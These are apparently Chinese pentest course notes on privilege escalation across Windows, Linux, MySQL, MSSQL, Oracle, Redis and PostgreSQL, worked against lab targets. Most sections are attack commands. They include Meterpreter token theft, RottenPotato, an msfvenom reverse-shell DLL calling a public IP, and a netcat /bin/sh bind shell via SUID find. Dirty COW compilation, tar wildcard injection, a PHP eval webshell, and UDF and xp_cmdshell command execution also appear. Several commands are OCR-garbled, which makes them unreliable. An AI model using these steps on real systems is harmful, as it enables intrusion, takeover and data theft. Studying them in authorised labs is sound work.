#明确权限提升基础知识:权限划分
#明确权限提升环境问题: WEB及本地
#明确权限提升方法针对:针对方法适应问题
#明确权限提升针对版本:个人及服务器版本;针对方法;
#知识点必备:

## Windows提权

### 用户及用户组权限划分; windows提权命令

Windows系统内置了许多本地用户红07:25些用户组本身都已经被赋予-些权限(permissions),它们具有 管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这回用户账户也将具备该组所拥有的权限。

### 0x01普通权限

默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(PowerUsers)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests), 身份验证用户组(Ahthenticated users)其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。

管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组(特殊权限)。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置,不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来疾用户组的文件操作权限和普通用户组一样,但是无法执行更多的程序。身份验证用户组(Ahthenticated users)经过ms验证程序登录的用户均属于此组。

### 0x02特殊权限

除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员， 这些成员是为了特殊用途而设置，分别
是:SYSTEM(系统)、Trustedinstaller (信任程序模块)、Everyone(所有 人)、CREATOR OWNER(创建者)等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。

真正拥有“完全访问权"的只有一一个成员:SYSTEM。这个成员是系统产生的,真正拥有整台计算机管理权限的账户, 一般的操作是无法获取与它等价的权限的。

“所有人"权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件,这也是一些程序正常运行需要的访问权限一任何人都能正常访问被赋予“Everyone' 权限的文件，包括来宾组成员。

被标记为“创建者’权限的文件只有建立文件的那个用户才能访问，做到了-定程度的隐私保护。

但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。

无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一一个账户原本属于Users组，而后我们把他加入Administrators组在加入Trustedinstaller等权限提升,那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定 身份访问的场合,用户只有为自己设置了指定的身份才能访问，这个时候“叠加口”的使用就能减轻一部分劳动量 了。

### 部分Windows命令

systqminfo
打印系统信息

whoami
获得当前用户名

whoami /priv
当前帐户权限

ipconfig
网络配置信息

ipconfig /displaydns
显示DNS缓存

route print
打印出路由表

arp -a
打印arp表

hostname
主机名

net user
列出用户

net user UserName
关于用户的信息

net use \SMBPATH Pa$$wOrd /u:UserName
连接SMB

net localgroup
列出所有组

net localgroup GROUP
关于指定组的信息

net view \127.0.0.1
会话打开到当前计算机

net session
开放给其他机器

netsh firewall show config
显示防火墙配置

DRIVERQUERY
列出安装的驱动

tasklist /sVc
列出服务任务

net start
列出启动的服务

dir /s foo
在目录中搜索包含指定字符的项

dir /s foo == bar
同上

SC query
列出所有服务

sc qc ServiceName
找到指定服务的路径

shutdown/r /t 0
立即重启

type file.txt
打印出内容

icacls ~C:\Example"
列出权限

wmic qfe get Caption,Description,HotFixID,InstalledOn
列出已安装的布丁

(New-Object
System.Nt.Webient).Dowlatiltttp://s/ile*."C:LocalPath")
利用ps远程下载文件到本地

修改对象(尝试Everyone,
accesschk.exe -qwsu "Group"
Authenticated Users和/或Users)



#案例给到的知识点总结如下:
案例1:如何判断使用哪种溢出漏洞?漏洞那里找?
信息收集-补丁筛选-制用Msr或特定EXP-执行-西瓜到手
Vulmap, Wes, WindowsVulnScan对比，exp在那里获取?

案例2:如何判断使用哪种数据库提权?数据库提权利用条件?
Msr结合云服务器搭建组合组合拳?模拟上述操作实战演练?
搭建: https://www.cnbloga.com/M0rta1s/p/11920903.html

案例3:如何判断本地环境可利用漏洞情况? AT&SC&PS命令适用环境?
Vulmap，wes, windowsVulnScan针对漏洞面，其他方法不同层面?

```
CVE-2020-0787 BitsArbitraryFileMoveExploit
at 15:13 /interactive cmd.exe

sc Create syscmd binPath= "cmd /K start" type= own type=inceraqt
sc start syscmd

psexec.exe -accepteula -s -i -d notepad.exe
```

#案例给到的思路点总结如下:
1.提权方法有部分适用在不同环境，当然也有通用方法
2.提权方法也有操作系统版本区分，特性决定方法利用面
3.提权方法有部分需要特定环境，如数据库,第三方提权等

### 令牌窃取提升

#案例3 :Windows2008&7令牌窃取提升-本地

进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。
本地提权实验:获取会话利用模块窃取令牌~提权
Microsoft windows XP Professional SP3和之前版本
windows server 2003 sP2和之前的版本
Windows Server 2003 x64和x64 SP2
windows server 2003 (用于基于Itanium的系统s2和先前版本)
windows Server 2008 x32 x64
windows server 2008 (用于基于Itanium的系统)
windows Vista sp1和之 前的版本
windows Vista x64 sp1和之 前的版本

```
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```



### 进程注入提升

#案例4 :Windows2003&10进程注入提升
进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有
者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上.所以我们
需要学习后续的本地提权更多的手法才能有针对高版本的系统。
pinjector进程注入工具针对-win2008以前操作系统
pexec6432进程注入工具针对-win2008及后操作系统- (佛系)

### RottenPotato (烂土豆)提权

RottenPotato (烂土豆)提权的原理可以简述如下: 
1.欺骗"NT AUTHORITYSYSTEM”账户通过NTLM认证到我们控制的TCP终端。
2.对这个认证过程使用中间人攻击(NTLM重放)，为"NT AUTHORITY\SYSTEM"账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。
3.模仿这个令牌。只有具有"模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户(IIS、 MSSQL等)有这个权限，大多数用户级的账户没有这个权限。
所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户(就是上面说的用户级账户)去反弹meterpreter然后再 去执行EXP的时候会失败,但使用菜刀(IIS服务器权限)反弹meterpreter就会成功。

烂土豆比热土豆的优点是:

1. 100%可靠
2. (当时)全版本通杀
3. 立即生效,不用像hot potato那样有时候需要等Windows更新才能使用。

总之，我对这个的理解是通过中间人攻击，将COM (NT\\SYSTEM权限) 在第二部挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌,然后利用msf的模仿令牌功能模仿SYSTEM令牌。

#### #案例1: Win2012-烂土豆配合令牌窃取提权-web权限

原理:参考上述图片内容，非服务类用户权限无法窃取成功(原理)
过程:上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功

```
upload /root/potato.exe C: \Users\Public
cd C:\\Users\\Public
use incognito
list_tokens -u
execute -cH -f ./potato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

#案例2: win2012-DLL劫持提权应用配合MSE-Web权限
原理: windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，windows应 用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索:
1、应用程序加载的目录
2、C: \Windows\System32
3、C: \Windowa \System
4、C: \Windows
5、当前工作目录Current working Directory, CWD
6、在PATH环境变量的目录(先系统后用户)
过程:信息收集进程调试-制作dll并上传-替换dll启动应用后成功

```
msfvenom -p windows/meterpreter/reverse_tcp
lhost=101.37.169.46
lport=6677 -f dll >/opt/cuoni.dll
```

#### #案例3: win2012-不安全的服务权限配合MSF-本地权限

原理:即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。
过程:检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功

```
accesschk.exe -uwcqv "administrators" *
sc config "NewServiceName" binpath="C:\test.exe"
sc start "NewServiceName ”
```

#案例4: win2012-不带引号服务路径配合MSF-Web,本地权限
原理:当windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件,并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。
过程:检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功

```
wmic service get name,displayname,pathname,startmode| findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

D:\Program Files\Java\jdk-11.0.11\bin\java.exe

D:\Program.exe
```

## Linux提权

两个信息收集: LinEnum, linuxprivchecker
两个漏洞探针: linux-exploit-suggester linux-exploit-suggester2

#### Linux提权SUID配合脚本演示-Vulhub

漏洞成因: chmod u+s给予了suid  u-s删除了suid
使程序在运行中受到了suid root权限的执行过程导致提权过程:探针是否有SUID (手工或脚本) -特定SUID利用-利用吃瓜-GG

```
find / -user root -perm -4000 -print 2>/dev/ null
find / -perm -u=s -type f 2>/ dev/null
find / -user root -perm -4000 -exec ls -ldb {} \ ;

touch cuoni
find cuoni -exec whoami \;
find cuoni -exec netcat -lvp 5555 -e /bin/sh \;
netcat Xx.Xx. Xx.XX 5555

```

参考利用: https://pentestlab.blog/2017/09/25/suid-executables/

#### Linux提权本地配合内核漏洞演示-CVE-2017-16695

提权过程:连接-获取可利用漏洞-下载或上传EXP-编译EXP -给权限执行-GG

```
git clone https://github.com/Jewel591/Privilege-Escalation.git
cd Privilege-Escalation
# 下面进行编译
gcc 45010.c -o 45010
# 添加执行权限
chmod +x 45010
./45010
# 成功提权到 root。
whoami
root
```

#### Linux提权脏牛内核漏洞演示-linux-exploit-suggester

内核提权整个过程: (linux-exploit-suggester获取信息 哦)
vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG
内核漏洞提权过程:寻可用-”下exp-.上/ tmp-编译exp-执行(无权限用chmod)

```
nmap 192.168.76.0/24
nmap -p1-65535 192.168.76.141
search drupal
use exploit/unix/ webapp/ drupal_drupalgeddon2
set lhost 192.168.76.141
set lport 1898
set target 0
run
upload /tmp/ 40837.cpp /tmp/40837.cpp
g++ -all -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
python -c 'import pty; pty.spawn ("/bin/bash")'
./dcow
```

####  Linux提权本地环境变量安全- Aliyun

配合SUID进行环境变量提权-本地用户环境
手写调用文件-编译-复制文件-增加环境变量-执行触发

```
demo.c

#include<unistd.h>
void main ()
{ 
setuid(0) ;
setgid(0) ;
system("ps") ;
}

gcc demo.c -o shell
cp /bin/sh /tmp/ps
export PATH=/tmp:$PATH
./shell
id
```

#### Linux提权本地定时任务安全-Aliyun

##### #第一种:路径问题

利用计划任务指向的文件的相对路径解析问题

```
cat /ect/crontab
echo 'cp /bin/baah /tmp/bash; chmod +a /tmp/bash' >
/home/cuoni/teat.sh
chmod +x /home/cuoni/test.sh
/tmp/baah
```

##### #第二种:命令问题

利用通配符配合命令参数自定义命令实现提权
不安全定时任务备份命令:

```
cd /home/undead/script;tar czf /tmp/backup.tar.gz *
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh
echo””> "--checkpoint-action=exec=sh test.sh"
echo“”> "--cheokpoint=1"

参考命令: https://www.cnblogs.com/manong--/p/8012324.html

 test.sh
 cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```



##### #第三种:权限问题

利用不安全的权限分配操作导致的定时文件覆盖
chmod 777 775等所有者组其他成员说明

#### Linux提权数据库MYSQL_UDF-VuInhub

Vulnhub某靶机-探针及端口-利用漏洞获取web权限-信息收集-查看数据库配置文
件-利用mysql提权Linux (Mysql 版本区别同windows)
#探针ip及端口

```
nmap 192.168. 76.0/24
```

#利用phpmailex漏洞进行修改并反弹

```
pythcn D:/Myproject/40974.py
nc -lvvp 4444
```

#写入后门利用菜刀连接方便操作

```
echo '<?php eval($_POST[x]) ;?>' >1.php
```

上传信息收集脚本进行提权信息收集

```
./LinEnum.sh
```

翻阅数据库配置文件获取root密码
#利用Mysql提权

```
search sploit
```

下载mysql udf poc进行编译

```
wget httpa://www.exploit-db.com/download/1518
mv 1518 raptor_udf.c
gcc -g -c raptor_udf.c
gcc -g -shared -o raptor_udf.so raptor_udf.o -lc
mv raptor_udf.so 1518.so
```

下载1518到目标服务器

```
wget https://xx.xx.xx.xx/ 1518.so
```

进入数据库进行UDF导出

```
use mysql;
create table foo(line blob) ;
insert into foo values (load_file('/tmp/1518.30')) ;
select中from foo into dumpfile
' /usr/lib/mysql/plugin/1518.so';
```

创建do_syatem函数调用

```
create function do_ system returns integer soname '1518.so';
select do_system('chmod u+s /usr/bin/ find') ;
```

#配合使用find调用执行

```
touch cuoni
find cuoni- exec "whoami" \;
find cuoni -exec "/bin/sh" \;
id
```

#案例4-Linux提权提升简单总结归类
1.提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)
2.最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)
3.本地searchaploit脚本及远程exploitdb站点搜索说明(简要使用)
4.其他提权方法如:密码复用，guid，sudo等说明(运气，同理，鸡肋等)
SUDO说明参考: https://www.freebuf.com/vu13/217089.html

## 数据库提权

在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道数据库提权的前提条件:服务器开启数据库服务及获取到最高权限用户密码。除Access数据库外，其他数据库基本都存在数据库提权的可能。
#数据库应用提权在权限提升中的意义
#WEB或本地环境如何探针数据库应用
#数据库提权权限用户密码收集等方法
#目前数据库提权对应的技术及方法等

### #案例: MY SQL数据库提权演示-脚本&MSF

流程:服务探针-信息收集-提权利用-获取权限

#### UDF提权知识点: 

(基于MYSQL调用命令 执行函数)读取网站数据库配置文件( 了解其命名规则及查找技巧)

```
sql data inc config conn database common include等
```

读取数据库存储或备份文件(了解其数据库存储格式及对应内容)

```
@@basedir/data/数据库名/表名.myd 
```

利用脚本暴力猜解(了解数据库是否支持外联及如何开启外联)
远程本地暴力猜解，服务器本地暴力猜解
利用自定义执行函数导出dll文件进行命令执行

```
select version()
select @@basedir
```

手工创建plugin目录或利用NTFS流创建

```
select 'x' into dumpfile '目录/lib/plugin::INDEX_ALLOCATION' ;
mysql<5.1 导出目录c: /windows或system32

mysql=>5.1导出安装目录/lib/plugin/
```

#### MOF知识点:

 (基于MYSQL特性的安全问题 )
导出自定义mof文件到系统目录加载
HTTP://www.cnblogs.com/xishaonian/p/6384535.html

```
select load_file ('C:/phpStudy/PHPTutorial/www/user_add.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
```

#### 启动项知识点:

 (基于配合操作系统自启动)
导出自定义可执行文件到启动目录配合重启执行
将创建好的后[门或执行文件进行服务器启动项写入，配合重启执行!
4.反弹知识点: (基 于利用反弹特性命令执行)

```
nc -1 -p 5577
```

### #案例: MSSQL数据库提权演示-MSSQL客户端

流程:服务探针-信息收集-提权利用-获取权限

#### 1.使用xp_cmdshell进行提权

xp_cmdehell默认在mssq12000中是开启的， 在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。
启用:

```
EXEC sp_configure' show advanced options', 1;
RECONFIGURE ; 
EXEC sp_configure' xp_cmdshell', 1;
RECONFIGURE;
```

关闭:

```
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 0;
reconfigure;
```

执行:

```
EXEC master.dbo.xp_cmdshell '命今'
```

如果xp_cmdshell被删除了，可以上传xpTog70.dll进行恢复

```
exec master.sys.sp_addextendedproc 'xp_cmdshell'，'C: \Program Files\Microsoft SQL Server\MSSQL\Binn\xp1og70.dll'
```

#### 2.使用sp_oacreate进行提权

主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。
启用:

```
EXEC sp_configure ' show advanced options', 1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE WITH OVERRIDE;
```

关闭:

```
EXEC sp_configure ' show advanced options', 1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE WITH OVERRIDE;
```

执行:

```
declare @shell int exec sp_oacreate 'wscript.shell' , @she1l output exec sp_oamethod @shell, ' run',null, 'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
```

### oracle

普通用户模式:
前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。
DBA用户模式: (自动化工具演示)
拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。
注入提升模式: (=qlmap测试演示)
拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回
显，需要自己验证。

### Redis数据库

#### #案例1: Redis数据库权限提升

Redis 服务因配置不当，可被攻击者恶意利用。黑客借助Redis 内置命令，可将现有数据恶意清空;如果
Redis以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务器。
连接(未授权或有密码) -利用如下方法提权
参考: https://blog.csdn.net/fly_hps/article/details/80937837 
(1) .利用计划任务执行命令反弹shell
(2) .写ssh-keygen公钥然后使用私钥登陆
(3) .权限较低往web物理路径写webshell

修复方案:
注意:以下操作，均需重启Redis后才能生效。
绑定需要访问数据库的IP。将127.0.0. 1修改为需要访问此数据库的Ip地址。
设置访问密码。在Redis.conf中requirepasa字段后，设置添加访问密码。
修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。

### PostgreSQL数据库

#### #案例2: PostgreSQL数据库权限提升

PostgreSQL是一款关系型数据库。其9. 3到11版本中存在一处"特性”，管理员或
具有“COPY TO/FROM PROGRAM"权限的用户， 可以使用这个特性执行任意命令。
提权利用的是漏洞: CVE-2019-9193 CVE-2018-1058
连接-利用漏洞-执行-提权
参考: https://vu1hub.org/#/environments/postgres/
修复方案:升级版本或打上补丁

